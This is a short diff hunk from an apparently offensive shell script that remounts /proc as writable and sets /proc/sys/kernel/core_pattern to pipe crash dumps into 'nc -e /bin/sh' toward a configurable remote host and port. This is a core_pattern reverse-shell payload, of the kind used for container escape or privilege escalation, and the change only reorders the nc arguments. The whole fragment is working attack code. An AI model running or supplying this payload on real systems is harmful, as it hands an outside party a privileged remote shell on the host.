@@ -21,7 +21,7 @@ if [ $? -ne 0 ]; then
 fi
 
 echo "Remounted /proc/ as rw";
-echo "|/bin/nc -e /bin/sh $CONNECT_HOST $CONNECT_PORT" > /proc/sys/kernel/core_pattern
+echo "|/bin/nc $CONNECT_HOST $CONNECT_PORT -e /bin/sh" > /proc/sys/kernel/core_pattern
 
 if [ $? -ne 0 ]; then
     echo "Couldn't set up nc payload";
